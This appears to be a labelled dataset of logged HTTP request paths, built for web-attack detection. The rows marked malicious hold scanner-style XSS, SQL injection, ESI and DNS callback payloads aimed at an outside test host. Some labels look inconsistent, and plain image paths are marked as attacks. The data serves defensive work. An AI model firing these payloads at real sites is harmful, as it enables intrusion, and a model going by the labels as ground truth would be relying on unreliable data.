request	label
"/************/template/jcse/110105008056111/16/'""""()&%<acx><script >vpin(9110)</script>/plugin/waterpull/pinterest_grid.js"	1
/****/jtdt/2020_jtyw/202002/w020200207725105644523.jpg	0
/****/xqdt/byq/201807/w020180731340413178701.jpg	0
/**********/system/2021/12/16/013495425.shtml	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6768\u56de\u65cf\u4e61	0
/****/xqdt/hnx/201610/w020161025738238696249.jpg	0
/****/shzr/lnysj/'http:/leyubet1410.com/'	0
"/***/2021'""""()&%<acx><script >kunb(9796)</script>/10/12/art_32_242398.html"	1
"/****/wdsjs<esi:include src=""""http://bxss.me/rpb.png""""/>/hfswsj/zmhdyc.html"	1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/******/scy_kjcxzjeg_03.png	0
/****/xqdt/byq/201810/w020181023387974787734.jpg	0
"/****/system/2021/09/08/013447520'""""/><img src=javascript:alert(1513) .shtml"	1
/*******/201812/201812071654171209.html	0
/******/if(now()=sysdate(),sleep(15),0)/urite/urite.min.js	1
/****/system/2021/08/05/javascript:window.print()	1
/****/zzxxgk/jjhzj/sqgk/xhjj/	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u897f\u590f\u533a\u946b\u60a6\u68cb\u724c\u5ba4	0
/**********/system/2021/10/01/013459704.shtml	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u9999\u4e07\u5e74\u9762\u9986	0
"/****/byszf/sz/202108/t20210806_185416.html?leader=张延保<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtl7xqgh6cow7gbkzsatfszk=&openid=ovl7jjjdzybd3abw3jlkeoct8f3u&outer_str=14372&activate_ticket=fdzv9emqaffrnr3xboqhbycifyhctwdr wmda2wxnyfoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi78hoabwc2qkb0hl4gwlwl0=	0
/***/0/00/92/63/926319_014262.gif	0
/****/201909/t20190926_1757087.html	0
/********/plan_template_preview.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','a719s'))	1
/****/zgsdt/2011zgsdt/201412/w020141218475319391085.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u60e0\u4f17\u5927\u836f\u5e97	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u674e\u519b\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/tusby/xdny/201910/w020191028322698324361.png	0
/***/003/004/136/00300413671_a173d4af.png	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202102/w020210204331689400212.jpg	0
/**********/system/2021/12/20/013497257.shtml	0
"/***/2019/11/17/art_392_192569.html/""><script>alert(959)</script>"	1
/****/yqzt/mtjs/	1
"/****/web/search?page=2&channelid=253477&searchword=1*/-->'""""></iframe></script></style></title></textarea><script >alert(85490)</script>&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10"	1
/****/xxgkml/qtfdxx/zcjd/qwjd/list.html	0
"/****/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='""><script>alert(77729;</script>"	1
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/base64.js	1
/**********/system/2021/07/30/013427856.shtml	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(854)"">?_=1630311617223"	1
/**********/system/2021/12/20/013497322.shtml	0
/******/xxwzqh/img3/4.jpg	0
/******/system/2015/03/03/011649859.shtml	0
/****/bmkx/rmyh/201806/p020180629348147329592.docx	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u7efc\u5408\u5546\u5e97	0
/**********/system/2020/06/01/013174884.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5fd7\u82b1\u5bbe\u9986	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u946b\u6e90\u5bb6\u5177\u5e97	0
/**********/system/2021/11/20/javascript:void();	1
/****/system/2017/10/19/javascript:window.close();	1
/****/system/2021/12/14/013493993.shtml	0
/**********/system/2021/10/11/013462311.shtml	0
/****/20200708/e103284553.html	0
/wp-content/*******/404-plugin/c.php	1
/***/0/02/12/44/2124404_800529.jpg	0
"/****/web/search?iptsword=*/-->'""""></iframe></script></style></title></textarea><script >alert(40430)</script>"	1
/****/zdlygk/ncwywfgz/ycs%' and 2*3*8=6*8 and 'd2xy'!='d2xy%/hlx/xmb_gzdxb.htm	1
/****/20200926/e107491001.html	0
/******/visitcount/visit.jsp?i_columnid=1&i_webid[0]==extractvalue(1,concat(char(126),md5(1735899078)))and 3 in &i_webid[1]=3&type=1	1
/****/bmkx/sfgw/201610/local.replace(	0
/**/index.php?title=acunetixtest109b78&action=submit	1
/******/	1
/****/czgk/bmjs/zzqjcyxt/ycxjcy/201708/t20170818_549571.html	0
/****/202101/t20210108_269123.html	0
/****/b-e722179.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u037f&l=\ufffd\ufffd\ufffd	0
/****/system/count/0036053/000000000000/	0
/****/xqdt/jtx/201610/t20161025_43465.html	0
/*****/system/2020/08/17/javascript:void(0);	1
/****/xxgknb/2018/bmnb2018/201903/w020190306323762411278.jpg	0
"/****/zzxxgk/tjj/zfxxgkml_2127/'""""()&%<acx><script >uocq(9462)</script>_2042/list.html"	1
/*******/zwgk/czgk/bmyjs/rmtt/fxh/	0
/*****/hzgy/cpgyss.asp?key=\u001a\u001a\u001a\u0093\u001a\u0094?\u001a\u001a\u008a\u001a\u0080\u89c4\u0090\u009e\u001a\u0083\u001a\u001a\u001a\u001a\u009c\u001a\u001a\u001a\u001a\u009f\u001a\u001a\u001a\u0090\u001a\u001a\u0086\u001a\u0080\u5b64\u0089\u001a\u0091\u0081\u001a\u0085\u001a\u0085\u008d\u6d60\u60f0\u001a\u0084\ufffd\u517c\u001a\u0087\u001a\u0087\u0086\u5382\u5bb6	0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u5927\u6b66\u53e3\u533a\u552f\u4e1d\u9020\u578b\u5e97	0
/******/system/2018/02/07/javascript:window.print()	1
/****/qzfwj/201911/t20191111_1845248.html	0
/*******/qiye/businesses-e32757_2.html?category_id=157230	0
/*****/gy48/cpgyss.asp?key=\u65e0\u673a\u73bb\u7483\u94a2\u98ce\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
/**********/system/2020/05/22/013168025.shtml	0
/****/20210719/10149.html	0
"/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqdzj/\""javascript:void(0)\"""	1
/*****/shxw/	0
/****/category/jishuchuangxin?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--	1
/****/tzgg/201201/t20120109_319129.html	0
/zwxx_11337/****/202007/t20200727_2173232.html	0
/***/0/02/11/81/2118197_989582.png	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u770b\u70b9	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04ba\u03bb\ufffd\u01bf\ufffd&l=\ufffd\u03fa\ufffd	0
/******/yzys/images/top.jpg	0
/zwxx_11337/****/zcjd/202111/t20211112_3126387.html	0
/****/20210207/e116052937.html	0
/****/zfwjn/1088/1103/list.html?new='.gethostbyname(lc('hitse'.'ropwzcqkd19b5.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(113).chr(82).chr(99).chr(79).'	1
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=0'xor(if(now()=sysdate(),sleep(15),0))xor'z	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u946b\u76db\u6e90\u5546\u8d38\u90e8	0
/****/zzxxgk/bmfgj/fgztzl/201904/w020210428406951951240.jpg	0
/****/config_data.php	1
/******/uploadpic/image/20190603/1559554695103125.jpg	0
/****/system/2017/03/09/javascript:dozoom(12)	1
/****/qtgkxx/201806/t20180620_188343.html and 1=1	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4f18\u6d17\u5e93\u5e72\u6d17\u5e97	0
/*******/qiye/b-e2232186.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u535a\u4ea6\u8427\u996e\u54c1\u5e97	0
/****/xxgkml/qtfdxx/zcjd/szcjd/202106/t20210616_183828_wap.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u91d1\u6854\u82d1\u9ebb\u8fa3\u70eb\u5e97	0
/**********/system/2021/08/31/013442809.shtml	0
/****/js/commons/urls.js?v=11&time=1639991012754	0
/****/ and 1=1	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(371)</script>?_=1630311380750"	1
/*********/system/2008/02/15/002372346.shtml	0
"/****/zzxxgk/tjj/zfxxgkml_2127/hygq_"""".gethostbyname(lc(""""hitpc"""".""""eqbybkuoa9f51.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(110).chr(77).chr(106).chr(80).""""/list.html"	1
/******/visitcount/visit.jsp?i_columnid[0]==2and 3 in &i_columnid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1074475338')))&i_webid=1&type=1	1
/****/system/2017/03/11/012261595.shtml	0
/*******/201906021714192546	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5174\u4ec1\u9547\u7530\u519b\u7164\u70ad\u7ecf\u9500\u90e8	0
/****/kjdt/index_151.xml	0
/****/byyw/index_29.html	0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=34&i_articleid=200077	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u5fd7\u9f99\u52b3\u52a1\u961f	0
/******/jslib/tag/	1
/**/system/2021/12/08/012228283.shtml	0
/**********/system/2021/04/09/013366311.shtml	0
"/************/template/jcse"""" and 2*3*8=6*8 and """"uz9v""""=""""uz9v/110105008056111/16/images/common.js"	1
/****/zjdt/kjybzde/gzdt/if(now()=sysdate(),sleep(12),0).htm	1
/**/system/2020/11/25/012094560.shtml	0
/****/czgk/bmjs/index_22.html	0
/*******/qiye/b-e429708.html	0
"/******/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
/***/template.cfm?moduletitle=alert(777)	1
/****/zdlygk/if(now()=sysdate(),sleep(12),0)/zws/hyx/xmb_gzdxb.htm	1
/****/category/redianguanzhu?page=1</script><script>yipq(9382)</script>	1
/****/bmkx/sfgw/201808/url	0
/***/interface/url_total_pv.json.jsp?callback=jquery191044106191949614515_1640009031938	0
"/*****/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
/*****/gy42/cpgyss.asp?key=\u5929\u6d25\u5927\u53e3\u5f84\u539a\u58c1\u65e0\u65b0\u95fb\u8d44\u8baf&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/whs/yw_1286/202009/t20200922_2239408.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19105141276063253475_1639991058606	0
/*******/gjzdsys	0
/****/bmkx/sczj/202009/t20200921_172457_wap.html	0
/*******/qiye/businesses-e42579_2.html?category_id=251687	0
/******/ld_xwzx_bg03_03.png	0
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqslt/\""javascript:void(0)\"""	1
/**/products/powermachinery/201505/w020150524336655719828.jpg	0
/images'||'/*/xys.css	1
/******/20210125/9322.html	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202111/t20211122_196778.html	0
/***/mswpmm/common/newaccount.aspx?btncancel=alert(777)	1
/*******/202104/202104091338491119.html	0
/***/resource/js/***/lib/bootstrap.min.js?v=17	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/202112/t20211204_197300.html	0
/wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?wpml_lang=&calendar_id=1&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &year=<script language='php'>echo 10516*61501;</script>	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u798f\u946b\u6c7d\u8f66\u9500\u552e\u4e2d\u5fc3	0
/**********/system/2021/12/20/013497309.shtml	0
/****/20210415/javascript:void(0);	1
/****/20201116/e110471975.html	0
"/**/ui"""" and 2*3*8=6*8 and """"xsgq""""=""""xsgq/lib/jquery/jquery.min.js"	1
/******/system/2021/12/06/javascript:void(0);	1
/******/system/2017/05/22/012316734.shtml	0
/******/uploadpic/image/20190603/1559554695870748.jpg	0
/****/qzfwj/201801/t20180115_668667.html	0
/**********/system/2020/12/04/013295953.shtml	0
/******/_content/download.jsp?urltype=news.downloadattachurl%' and 2311=1704 and '%%'='%&owner=1707212448&wbfileid=51419	1
/****/czgk/bmjs/gdyx/zzqjxy/202008/	0
/****/zzxxgk/jjhzj/zsxw/202109/t20210906_186400.html	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqdwbgt/201908/p020190808586353934529.pdf	0
/**********/system/2021/12/15/013494559.shtml	0
"/****/'""""()&%<acx><script >hvqt(9638)</script>/"	1
/****/b-e1146024.html	0
/*************/zwgk/tzgg/202112/t20211217_3232797.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4e2d\u79d1\u623f\u5730\u4ea7\u5f00\u53d1\u6709\u9650\u516c\u53f8	0
/****/bmkx/rmyh/201610/t20161025_39779.html	0
/***/800/11/25/24/11252455_509955.jpg	1
/****/20210421/9728.html	0
/*******/201910/201910291543361044.html	1
/wp-content/******/twentyten/languages/a.php	1
/*******/qiye/web/wgw/images/big-fontsize.png	0
/***/interface/comul_total.json.jsp?callback=jquery191017022731509723643_1640053518653	0
/zwxx_11337/****/202004/t20200408_2015304.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9a6c\u6b65\u6797\u5bbe\u9986	0
/******/usercenter/index?qrcode=19652&code=041cuj0w36thfx2buv1w3sjvtt3cuj0b	0
/****/ztly/lswh/201911/t20191122%' and 2*3*8=6*8 and 'wrpt'!='wrpt%_1859255.html	1
/***/003/004/503/00300450330_f3792b96.png	0
"/************/template/' 'a'.concat(70-3).concat(22*4).concat(100).concat(69).concat(121).concat(88) (require'socket'
socket.gethostbyname('hitzq' 'vlbfofsc60130.bxss.me.')[3].to_s) '/110105008056111/16/images/main.css"	1
/**/system/2021/02/04/012124605.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19108237272344106028_1639991148760	0
/zwxx_11337/****/201707/t20170727_301939.html	0
/*******/qiye/b-e1112072.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u6587\u537f\u51b7\u996e\u9500\u552e\u90e8	0
/*******/2ek52061.php	1
"/*****/wp-content/plugins/nextgen-gallery/nggallery.php?test-head='"""">alert(777);"	1
/****/system/2021/09/24/javascript:void(0);	1
/****/xqdt/hnx/202011/local	0
/******/public/2020/02/21/95670.images/v95670_b1582282020728_app.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6e20\u53e3\u4f0a\u5473\u98df\u82d1	0
/***/0/01/95/26/1952681_500534.jpg	0
/****/bmkx/sgtj/201809/t20180911_109864.html	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u745e\u7434\u670d\u88c5\u5e97	0
/****/bmkx/snmj/202005/w020200521328481134391.png	0
/****/201909/t20190926_1757659.html	0
"/****/zdlygk/bzxajgc/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/hlx.htm"	1
"/****/photostore/workbox.php?mode=addtolightbox&mediaid=""""><script>alert(777)</script>"	1
/zwxx_11337/*******/202110/t20211018_3095743.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u6d0b\u6b4c\u6c7d\u8f66\u7535\u74f6\u7ecf\u9500\u90e8	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5b66\u4e60	0
/***/mobile_h5/wapshouye.do?channelid=chanjing/zhizao	0
/****/bmkx/srsj/202103/t20210304_178168.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u66fc\u6590\u65af\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6c38\u798f\u5546\u5e97	0
/***/blockdata/getsearchinfo.do?&title=\u585e\u6069	0
/****/zgsdt/2021_qydt/202111/w020211130537240350960.jpg	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u84c9\u82f9\u517b\u6b96\u573a	0
/****/ztjj2022lz/lhsd/lhsdt/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u5e7f\u8fdb\u7164\u70ad\u7ecf\u9500\u90e8	0
/col'||'/*****/index.html	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u81fb\u6cf0\u8292\u996e\u54c1\u5e97	0
/zwxx_11337/****/202006/t20200623_2144202.html/index_1.html	0
/**/ohac/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(618)</script>?_=1630311532758"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u83b1\u7279\u9676\u74f7\u5e97	0
/**********/system/more/241000000000000/0005/241000000000000_00000510.shtml	0
/****/web/search?page=2&channelid=253477&searchword=1 and 5581=7382--&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtaptchssqn6oyceir3kh2ti=&openid=ovl7jju52aywoxfl8fsgzpxqaake&outer_str=14696&activate_ticket=fdzv9emqaffrnr3xboqhb4rtpbh16nptzl000r4ulj/oo8dbj5 fzedtzplsmcarg6aif9ikwqintb6jmxvztnmosdt9a5tuufqiuafueyg=	0
/**********/system/2021/12/17/013495774.shtml	0
/****/zzxxgk/jjhzj/zsxw/202102/t20210219_177639.html	0
/***/viewspace-875.html	0
/*****/system/2020/10/16/javascript:window.close();	1
/****/byszx/201903/t20190322_115445.html?leader=/xfs.bxss.me	1
/*******/o6ns8.php	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u8863\u5427\u670d\u88c5\u5e97	0
/zwxx_11337/****/201807/t20180716_904987.html	0
/***/0/00/18/32/183258_865693.jpg	0
/****/zgsdt/2021_qydt/202103/t20210307_271078.html	0
/*****/system/2021/12/04/javascript:void();	1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u82b1\u6f3e\u82b1\u827a\u9986	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u9038\u6668\u767e\u8d27\u5e97	0
"/***/2021/10/13/art"""" and 2*3*8=6*8 and """"v06l""""=""""v06l_31_242524.html"	1
/investors-garden/**********/0'xor(if(now()=sysdate(),sleep(3),0))xor'z/	1
/****/20211015/javascript:void(0);	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtmklcv/ipkrhcjiyadzcreg=&openid=ovl7jjkrzl4waaoyoq5mbvkllnjc&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb6gjgmou1kjxcshta9xlemzoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi6/yqfkpzqhlzfj9g0clkrs=	0
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqzzb/201602/t20160215_317850.html	0
/wp-content/*******/login-wall-bpjol/login_wall.php?login=cmd	1
/xwdt' and 2*3*8=6*8 and 'w7bz'='w7bz/****/fdcgl/gzdt.htm	1
/****/gjjj/201903/t20190328_206042.html	1
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12207,""place_id"":""fm_sp_ard"",""news_id"":""1265892""}"	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u901a\u8fbe\u6c7d\u8f66\u4fee\u7406\u90e8	0
/***/0/01/35/28/1352898_824241.jpg	0
/******/resource%' and 2*3*8=6*8 and 'alab'!='alab%/js/news/mp4video.js	1
/zwxx_11337/****/201705/t20170522_309140.html	0
/****/fkxxfy/202111/t20211105_196216.html	0
/*****/whcm	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6c47\u5347\u6e90\u7cae\u6cb9\u5e97	0
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=jianxun¤tpage=7&query=java	0
/****/202107/t20210702_2909236.html	0
"/***/col195/index.html/""""><script>alert(207)</script>"	1
/zwxx_11337/****/201809/t20180905_1032403.html	0
/****/ysqgk/zzqzfzsjgzssydw/sy.html?id=79	0
/zwxx_11337/****/202001/t20200130_1936346.html	0
/xxgk%' and 2*3*8=6*8 and 'v3m6'!='v3m6%/******/tjj/zfxxgkml_2127/jytabljg_2061/list.html	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtmma3ahvhtb/cznlcm6c8ce=&openid=ovl7jjlqrlkv7igemxpqos4u6h-0&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhbx1liu7mkqrvuvbeywbebd7oo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbizmy fysexld/fu3ipt2oze=	0
/****/ezgg/ezggfz/201611/t20161114_105538.html	0
"/**/?cmd=new_section§ion=""%3<script>alert(777);</script>"	1
/****/0316/822325.shtml	0
/**********/system/2021/12/16/013495273.shtml	0
/******/e,n.complete?t(n):(n.onload=function(){n.onload=null,t(n)},void(n.onerror=function(e){n.onerror=null,i(e)}))}var	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgxs/202103/t20210309_2620285.html	0
"/****/web/search?channelid=299868&perpage=1000' and 8167=4115 	1
/****/gfxwj/list_33.html	0
/******/system/2017/05/27/012322172.shtml	0
"/************/risk-disclosure/2017-03-0""""xor(if(now()=sysdate(),sleep(6),0))xor""""z/673.html"	1
/*****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6b22\u6b23\u6c34\u4ea7\u7ecf\u9500\u90e8	0
/***/col200/index.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u7167\u519b\u670d\u88c5\u52a0\u5de5\u5382	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u601d\u6e90\u5e9f\u54c1\u6536\u8d2d\u7ad9	0
/***********/hongguanjingji/2021-11-23/2010.html	0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqgtjyt/zzqgtt/index_1.html	0
/****/zgsdt/2011zgsdt/index_4.html	0
/*******/xe1.php	1
/****************/notification?access_token=58080d57-5529-42f2-9ed9-5ed1b4853455&id=undefined	0
/*****/static/fonts/element-icons.732389d.ttf	0
"/**/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status="" onmouseover=""alert(777)"""	1
/****/web/search?channelid=222832&searchword=\u534e\u7535\u56fd\u9645\u5b81\u590f\u65b0\u80fd\u6e90\u53d1\u7535\u6709\u9650\u516c\u53f8\u5b81\u4e1c\u5206\u516c\u53f8	0
/****/2p0d3t-syxw-e109150537.html	0
/**********/system/2021/10/24/013469153.shtml	0
"/****/xxgknb/2010/list.html?new=0.4586328373203723'""""()&%<acx><script >kgc8(9349)</script>"	1
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/wzs/qtxs/xmb_gzdxb.htm	1
/****/system/2016/09/29/javascript:dozoom(14)	1
/**********/system/2021/12/19/013496794.shtml	0
/****/zxxbjt-syxw-e110803022.html	0
/***/003/002/991/00300299153_a7827f68.jpg	0
/****/api/apibankagreementcontroller/sendsoci801withtimecheck?lxsj=18676428656&gmsfhm=	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqkjt	0
"/****/p/bxss.me/t/xss.html?	1
/*******/mrj.php	1
/****/dzzb/201411/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/system/2018/03/06/javascript:window.close();	1
/**/vc/interface/visit.jsp?type=3&i_webid=1&i_columnid=84&i_articleid=222598&url=https:/axysex.com/nude/117467-fit-and-juicy-tushy-raw.php	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6559\u80b2\u5df7\u9752\u6625\u7684\u5473\u9053\u9910\u5385	0
/****/zjdt%' and 2*3*8=6*8 and 'zc5h'!='zc5h%/csjs/gzdt.htm	1
/****/system/2021/06/18/013404189.shtml	0
/****/sj1/tjxx/202109/t20210926_3048135.html	0
/****/201909/t20190926_1757459.html	0
/****/whhd/202105/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
"/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=bxss.me/t/xss.html?	1
